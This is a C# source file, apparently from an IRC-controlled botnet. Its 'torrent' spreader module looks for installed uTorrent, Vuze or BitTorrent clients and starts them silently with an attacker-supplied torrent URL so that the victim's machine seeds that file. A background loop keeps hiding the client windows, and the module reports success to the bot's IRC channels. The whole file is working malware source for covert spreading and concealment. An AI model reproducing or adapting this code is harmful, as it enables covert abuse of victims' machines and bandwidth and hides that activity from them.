using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace rundll32.spreaders;

internal class torrent
{
	private const int SW_HIDE = 0;

	private static string pf = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

	private static string ad = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string[][] ts = new string[3][]
	{
		new string[4] { "utorrent", "\\uTorrent\\uTorrent.exe", "\\uTorrent\\", "/DIRECTORY \"%sp%\" \"%tu%\"" },
		new string[4] { "azureus", "\\Vuze\\Azureus.exe", "\\Azureus\\torrents\\", "\"%tu%\"" },
		new string[4] { "bittorrent", "\\BitTorrent\\bittorrent.exe", "\\BitTorrent\\", "/DIRECTORY \"%sp%\" \"%tu%\"" }
	};

	private static Thread keepHidingT;

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	public static void seed(irc irc, string torrentUrl)
	{
		string text = "";
		string[][] array = ts;
		foreach (string[] array2 in array)
		{
			try
			{
				if (File.Exists(pf + array2[1]))
				{
					text = text + array2[0] + ", ";
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = pf + array2[1];
					processStartInfo.Arguments = array2[3].Replace("%sp%", ad + array2[2]).Replace("%tu%", torrentUrl);
					Process.Start(processStartInfo);
				}
			}
			catch
			{
			}
		}
		try
		{
			keepHidingT.Abort();
		}
		catch
		{
		}
		keepHidingT = new Thread(keepHiding);
		keepHidingT.Start();
		if (text != "")
		{
			text = text.Substring(0, text.Length - 2);
			string[][] onConnChannels = config.onConnChannels;
			foreach (string[] array3 in onConnChannels)
			{
				irc.sendMessage(array3[0], ".:Torrent:. - \u000308Seeding \u000309" + text + "\u000308!");
			}
		}
	}

	private static void keepHiding()
	{
		while (true)
		{
			string[][] array = ts;
			foreach (string[] array2 in array)
			{
				HideIt(array2[0]);
			}
			Thread.Sleep(500);
		}
	}

	private static void HideIt(string ClientProcess)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.ToLower().Contains(ClientProcess))
			{
				try
				{
					int hwnd = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd, 0);
				}
				catch
				{
				}
			}
		}
	}
}
